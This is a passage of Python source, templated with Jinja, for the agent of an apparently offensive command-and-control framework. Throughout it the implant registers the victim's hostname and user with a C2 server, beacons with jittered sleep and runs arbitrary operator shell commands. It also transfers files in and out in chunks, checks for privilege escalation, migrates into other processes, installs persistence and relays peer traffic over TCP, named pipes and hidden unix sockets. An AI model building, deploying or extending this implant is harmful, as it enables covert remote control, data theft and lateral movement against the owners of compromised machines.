        except Exception:
            pass
    if pid is None:
        return {"ok": False, "error": f"cannot resolve PID for {target}"}

    if technique == "auto":
        if PLATFORM == "windows":
            technique = "reflective"
        else:
            technique = "procwrite"

    if PLATFORM == "windows" and technique == "reflective":
        return _migrate_windows(pid)
    if PLATFORM in ("linux", "android") and technique == "procwrite":
        return _migrate_linux(pid)
    return _migrate_fork()
{% endif %}

# --------------------------------------------------------------------- #
#  Relay (P2P named-pipe / TCP)
# --------------------------------------------------------------------- #

{% if relay %}
class RelayPeer:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.last_seen = 0.0

class RelayNode:
    """Accepts inbound pipe/TCP connections and forwards to the C2, acting
    as a peer-to-peer relay. The relay binds {{ cfg.relay_bind }}:{{ cfg.relay_port }}."""

    def __init__(self, c2_host: str = "{{ cfg.host }}", c2_port: int = {{ cfg.port }}):
        self._peers: dict[str, RelayPeer] = {}
        for entry in {{ cfg.relay_peers | tojson }}:
            try:
                h, p = entry.rsplit(":", 1)
                self._peers[f"{h}:{p}"] = RelayPeer(h, int(p))
            except Exception:
                pass
        self._c2 = (c2_host, c2_port)
        self._running = False

    def start(self):
        self._running = True
        _th.Thread(target=self._listen_tcp, daemon=True).start()
        {% if is_win %}
        _th.Thread(target=self._listen_pipe, daemon=True).start()
        {% else %}
        _th.Thread(target=self._listen_unix, daemon=True).start()
        {% endif %}

    def _listen_tcp(self):
        with _sk.socket(_sk.AF_INET, _sk.SOCK_STREAM) as s:
            s.setsockopt(_sk.SOL_SOCKET, _sk.SO_REUSEADDR, 1)
            try:
                s.bind(("{{ cfg.relay_bind }}", {{ cfg.relay_port }}))
            except OSError as e:
                _log(f"Relay TCP bind failed: {e}", "error")
                return
            s.listen(5)
            while self._running:
                try:
                    conn, addr = s.accept()
                    _th.Thread(target=self._handle_peer, args=(conn, addr), daemon=True).start()
                except Exception:
                    pass

    {% if is_win %}
    def _listen_pipe(self):
        import ctypes
        from ctypes import wintypes
        PIPE_ACCESS_DUPLEX = 0x00000003
        PIPE_TYPE_MESSAGE = 0x00000004
        PIPE_READMODE_MESSAGE = 0x00000002
        PIPE_WAIT = 0x00000000
        PIPE_UNLIMITED_INSTANCES = 255
        kernel32 = ctypes.windll.kernel32
        while self._running:
            pipe = kernel32.CreateNamedPipeW(
                r"\\.\pipe\{{ cfg.relay_pipe }}",
                PIPE_ACCESS_DUPLEX,
                PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                PIPE_UNLIMITED_INSTANCES,
                65536, 65536, 0, None,
            )
            if pipe == -1:
                _t.sleep(1)
                continue
            kernel32.ConnectNamedPipe(pipe, None)
            _th.Thread(target=self._handle_pipe, args=(pipe,), daemon=True).start()

    def _handle_pipe(self, pipe):
        kernel32 = ctypes.windll.kernel32
        buf = ctypes.create_string_buffer(65536)
        bytes_read = wintypes.DWORD()
        while self._running:
            ok = kernel32.ReadFile(pipe, buf, 65536, ctypes.byref(bytes_read), None)
            if not ok:
                break
            payload = buf.raw[:bytes_read.value]
            self._forward(payload)
        kernel32.CloseHandle(pipe)
    {% else %}
    def _listen_unix(self):
        import tempfile
        sock_path = _o.path.join(tempfile.gettempdir(), ".{{ cfg.relay_pipe }}")
        if _o.path.exists(sock_path):
            _o.unlink(sock_path)
        with _sk.socket(_sk.AF_UNIX, _sk.SOCK_STREAM) as s:
            try:
                s.bind(sock_path)
            except OSError as e:
                _log(f"Relay unix bind failed: {e}", "error")
                return
            s.listen(5)
            while self._running:
                try:
                    conn, addr = s.accept()
                    _th.Thread(target=self._handle_peer, args=(conn, None), daemon=True).start()
                except Exception:
                    pass
    {% endif %}

    def _handle_peer(self, conn, addr):
        try:
            with conn:
                while self._running:
                    hdr = b""
                    while len(hdr) < 4:
                        chunk = conn.recv(4 - len(hdr))
                        if not chunk:
                            return
                        hdr += chunk
                    n = _st.unpack(">I", hdr)[0]
                    buf = b""
                    while len(buf) < n:
                        chunk = conn.recv(min(4096, n - len(buf)))
                        if not chunk:
                            return
                        buf += chunk
                    # Forward to C2, then relay response back to peer
                    resp = self._forward(buf)
                    conn.sendall(_st.pack(">I", len(resp)) + resp)
        except Exception:
            pass

    def _forward(self, data: bytes) -> bytes:
        try:
            t = make_transport()
            out = t.send(data)
            t.close()
            return out
        except Exception:
            return b""

_relay = None

def start_relay():
    global _relay
    _relay = RelayNode()
    _relay.start()
{% endif %}

# --------------------------------------------------------------------- #
#  Beacon loop
# --------------------------------------------------------------------- #

def _jittered_sleep(base: float, jitter_pct: int):
    """Sleep for base * (1 +/- jitter_pct/100)."""
    delta = base * (jitter_pct / 100.0)
    _t.sleep(base + _rnd.uniform(-delta, delta))

def _dispatch(task: dict) -> dict:
    """Route a server task to the right module handler."""
    action = task.get("action", "")
    if action == "ping":
        return {"pong": True, "id": AGENT_ID}
    {% if include_recon %}
    if action == "sysinfo":
        return mod_systeminfo()
    if action == "network":
        return mod_network()
    if action == "processes":
        return mod_processes()
    {% endif %}
    {% if include_exec %}
    if action == "exec":
        return mod_exec(task.get("command", ""), int(task.get("timeout", 60)))
    {% endif %}
    {% if include_fs %}
    if action == "fs_list":
        return mod_fs_list(task.get("path", "."))
    if action == "fs_get":
        # Chunked on purpose: a whole file in one reply would be a JSON string
        # of its base64 size, held in memory on both ends.
        path = task.get("path", "")
        offset = int(task.get("offset") or 0)
        length = int(task.get("length") or 0)
        try:
            size = mod_fs_size(path)
            data = mod_fs_get(path, offset, length)
        except OSError as e:
            return {"error": str(e)}
        return {
            "size": size,
            "offset": offset,
            "length": len(data),
            "eof": size >= 0 and offset + len(data) >= size,
            "data": _b64e(data).decode(),
        }
    if action == "fs_put":
        raw = _b64d(task.get("data", ""))
        return mod_fs_put(task.get("path", ""), raw, int(task.get("offset") or 0))
    {% endif %}
    {% if include_privesc %}
    if action == "privesc_check":
        return mod_privesc_check()
    if action == "privesc_suggest":
        check = mod_privesc_check()
        return {"check": check, "suggestions": mod_privesc_suggest(check)}
    {% endif %}
    {% if migration %}
    if action == "migrate":
        return migrate(task.get("target", ""), task.get("technique", "{{ cfg.migrate_technique }}"))
    {% endif %}
    if action == "shutdown":
        _log("shutdown requested")
        _sy.exit(0)
    return {"error": f"unknown action: {action}"}

def _c2_roundtrip(transport) -> bool:
    """Register, then beacon on that session until the link breaks."""
    session_id = _register(transport)
    _log(f"registered as session {session_id}")
    _run_session(transport, session_id)
    return True

def _register(transport) -> str:
    ident = identity()
    resp = transport.request({
        "type": "register",
        "hostname": ident["hostname"],
        "os": ident["os"],
        "arch": ident["arch"],
        "username": ident["user"],
        "agent_version": ident["version"],
    })
    if resp.get("type") != "registered" or not resp.get("session_id"):
        raise TransportError(f"register refused: {resp!r}")
    return resp["session_id"]

def _run_session(transport, session_id: str) -> None:
    """Check in, run what the server queues, report back, repeat.

    Returns only when the connection fails; main() then re-registers. Sleeping
    between check-ins happens on the same socket because the listener ties the
    session to the connection that opened it.
    """
    base_sleep = {{ cfg.sleep }}
    jitter_pct = {{ cfg.jitter }}
    while True:
        resp = transport.request({"type": "checkin", "session_id": session_id})
        if resp.get("type") == "error":
            raise TransportError(f"checkin refused: {resp.get('message')}")
        for task in resp.get("commands", []):
            result = _run_command(task.get("command", ""))
            transport.request({
                "type": "output",
                "session_id": session_id,
                "command_id": task.get("command_id", ""),
                "output": result,
            })
        _jittered_sleep(base_sleep, jitter_pct)

def _run_command(text: str) -> str:
    """Run one line of operator input and return output as text.

    Anything that is not a named module action is executed as a shell command,
    which is what an operator typing into `sessions interact` expects.
    """
    text = (text or "").strip()
    if not text:
        return ""
    task = _parse_command(text)
    try:
        result = _dispatch(task)
    except SystemExit:
        raise
    except Exception as e:
        return f"error: {e}"
    if task.get("action") in ("fs_get", "fs_put"):
        # Transfer replies are already chunked to fit and must stay parseable.
        return _render_result(result)
    return _clip(_render_result(result))


def _render_result(result) -> str:
    if isinstance(result, dict) and "stdout" in result:
        out = result.get("stdout") or ""
        err = result.get("stderr") or ""
        rc = result.get("returncode")
        if err:
            out += err if out else ""
        if rc:
            out += f"\n[exit {rc}]"
        return out.strip() or f"[no output, exit {rc}]"
    if isinstance(result, str):
        return result
    try:
        return _j.dumps(result, default=str)
    except Exception:
        return str(result)


def _clip(text: str) -> str:
    """Keep one command from outgrowing the listener's message ceiling.

    A line over MAX_MESSAGE_BYTES kills the connection mid-transfer, taking
    every other session command down with it.
    """
    limit = {{ cfg.max_output }}
    if len(text) <= limit:
        return text
    return text[:limit] + f"\n[output truncated at {limit} chars]"


def _parse_command(text: str) -> dict:
    # A line that is already a JSON task bypasses the vocabulary: file transfer
    # needs arguments (offset, base64 data) that do not survive being typed.
    if text.startswith("{"):
        try:
            task = _j.loads(text)
        except ValueError:
            return {"action": "exec", "command": text}
        if isinstance(task, dict) and task.get("action"):
            return task
        return {"action": "exec", "command": text}
    verb, _, rest = text.partition(" ")
    v, arg = verb.lower(), text[len(verb):].strip()
    if v in ("sysinfo", "network", "privesc_check", "privesc_suggest", "ping"):
        return {"action": v}
    if v == "ps":
        return {"action": "processes"}
    if v in ("exit", "shutdown"):
        return {"action": "shutdown"}
    if v == "fs_list":
        return {"action": "fs_list", "path": arg or "."}
    if v == "fs_get":
        parts = _sh.split(arg) if arg else []
        return {"action": "fs_get", "path": parts[0] if parts else "",
                "offset": int(parts[1]) if len(parts) > 1 else 0,
                "length": int(parts[2]) if len(parts) > 2 else 0}
    if v == "fs_put":
        # fs_put "<path>" <offset> <base64>
        parts = _sh.split(arg) if arg else []
        data = parts[-1] if parts else ""
        return {"action": "fs_put", "path": parts[0] if parts else "",
                "offset": int(parts[1]) if len(parts) > 2 else 0,
                "data": data}
    if v == "migrate":
        return {"action": "migrate", "target": arg}
    return {"action": "exec", "command": text}

# --------------------------------------------------------------------- #
#  Main entry point
# --------------------------------------------------------------------- #

def main():
    _log(f"starting agent {AGENT_ID} on {PLATFORM}/{ARCH}")
    {% if persistence %}
    try:
        install_persistence()
    except Exception as e:
        _log(f"persistence error: {e}", "debug")
    {% endif %}
    {% if relay %}
    try:
        start_relay()
    except Exception as e:
        _log(f"relay error: {e}", "debug")
    {% endif %}
    while True:
        transport = make_transport()
        try:
            _c2_roundtrip(transport)
        except Exception as e:
            _log(f"link lost: {e}", "debug")
            transport.close()
            _jittered_sleep({{ cfg.sleep }}, {{ cfg.jitter }})

if __name__ == "__main__":
    # Support --child-migrated so forked children skip persistence + relay bootstrap.
    if "--child-migrated" in _sy.argv:
        pass
    main()
'''
